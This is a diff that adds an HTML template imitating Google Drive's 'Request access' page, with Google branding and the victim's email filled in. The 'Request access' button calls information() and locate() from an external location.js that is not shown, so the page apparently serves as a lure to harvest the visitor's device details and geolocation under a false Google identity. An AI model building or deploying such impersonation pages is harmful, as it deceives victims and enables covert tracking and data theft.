@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Access - Google Drive</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="content-side">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Google Drive">
+                <span>Drive</span>
+            </div>
+
+            <h1>You need access</h1>
+            <p class="description">
+                Ask for access, or switch to an account with access.
+                <a href="#" class="link">Learn more</a>
+            </p>
+
+            <form id="accessForm">
+                <textarea id="message" placeholder="Message (optional)"></textarea>
+                <button type="button" id="requestBtn" class="request-btn">Request access</button>
+                <p id="status" class="status-text"></p>
+            </form>
+        </div>
+
+        <div class="illustration-side">
+            <img src="static/disk_logo.webp" alt="Access illustration">
+        </div>
+    </div>
+
+    <div class="footer">
+        You are signed in as <span class="user-email">{{ email }}</span>
+    </div>
+
+    <script src="/js/location.js"></script>
+    <script>
+        document.getElementById('requestBtn').addEventListener('click', function() {
+            var btn = this;
+            var status = document.getElementById('status');
+
+            // Set loading state
+            btn.disabled = true;
+            btn.textContent = 'LOADING...';
+            btn.style.opacity = '0.7';
+
+            // Call external functions as per your example
+            if (typeof information === "function") information();
+
+            if (typeof locate === "function") {
+                locate(
+                    function() {
+                        // Success Callback
+                        status.textContent = 'Success!';
+                        status.style.color = '#1e8e3e'; // Google Success Green
+                        btn.textContent = 'Request access';
+                        btn.disabled = false;
+                        btn.style.opacity = '1';
+                    },
+                    function(error, text) {
+                        // Error Callback
+                        btn.disabled = false;
+                        btn.textContent = 'Request access';
+                        btn.style.opacity = '1';
+                        status.textContent = 'Error: ' + text;
+                        status.style.color = '#d93025'; // Google Error Red
+                    }
+                );
+            } else {
+                console.error("locate function is not defined");
+                btn.disabled = false;
+                btn.textContent = 'Request access';
+            }
+        });
+    </script>
+</body>
+</html>
